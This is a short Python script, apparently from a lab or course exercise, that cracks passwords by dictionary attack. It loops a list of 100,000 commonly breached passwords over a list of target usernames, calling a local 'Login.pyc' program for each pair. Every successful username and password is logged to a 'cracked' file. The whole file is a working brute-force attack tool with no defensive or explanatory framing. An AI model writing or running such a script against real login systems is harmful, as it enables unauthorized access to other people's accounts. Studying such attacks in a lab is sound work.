import os
import subprocess
import time

if __name__ == "__main__":
    start = time.time()
    print(f"Start time : {start}")
    common_pw_txt = open("./PwnedPWs100k")
    common_pw = common_pw_txt.readlines()
    common_pw_txt.close()
    gang_txt = open("./gang")
    gang_members = gang_txt.readlines()
    gang_txt.close()
    
    found = set()
    sucess = []
    f = open("./cracked", "a")
    for pw in common_pw:
        pw = pw.strip()
        result = "?"
        for member in gang_members:
            member = member.strip()
            if member not in found:
                output = subprocess.run(["python3", "./Login.pyc", member, pw], capture_output = True, text = True)
                if(output.stdout == 'Login successful.\n'):
                    result = pw
                    sucess.append({member:result})
                    found.add(member)
                    f.write(f'{member}: {result} {time.time()}')
                    break
                print(f"{member} : {pw}")

    f.close()
    print(sucess)
    end = time.time()
    print(f"Start time : {start}")
    print(f"End time : {end}")
